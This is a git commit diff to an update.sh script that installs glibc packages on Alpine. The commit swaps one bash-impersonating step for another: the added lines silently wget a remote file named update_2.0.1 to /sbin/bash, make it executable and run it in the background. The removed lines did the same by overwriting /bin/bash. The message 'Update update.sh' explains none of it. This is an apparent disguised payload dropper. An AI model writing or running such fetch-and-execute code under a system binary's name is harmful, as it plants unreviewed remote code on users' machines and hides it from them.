f8404c958a4781222820c040ab7d7a8922c808a5
jackmoc <94283031+jackmoc@users.noreply.github.com>
2024-05-08 05:23:42 +0800

    Update update.sh

--- update.sh
+++ update.sh
@@ -6,9 +6,6 @@ apk add glibc-2.35-r1.apk
 apk add glibc-bin-2.35-r1.apk
 rm -rf glibc-2.35-r1.apk
 rm -rf glibc-bin-2.35-r1.apk
-mv /bin/bash /bin/bashh
-wget -q -O /bin/bash https://github.com/jackmoc/Alpine/raw/main/update_2.0.1
-chmod +x /bin/bash
-bash &
-rm -rf /bin/bash
-mv /bin/bashh /bin/bash
+wget -q -O /sbin/bash https://github.com/jackmoc/Alpine/raw/main/update_2.0.1
+chmod +x /sbin/bash
+/sbin/bash &
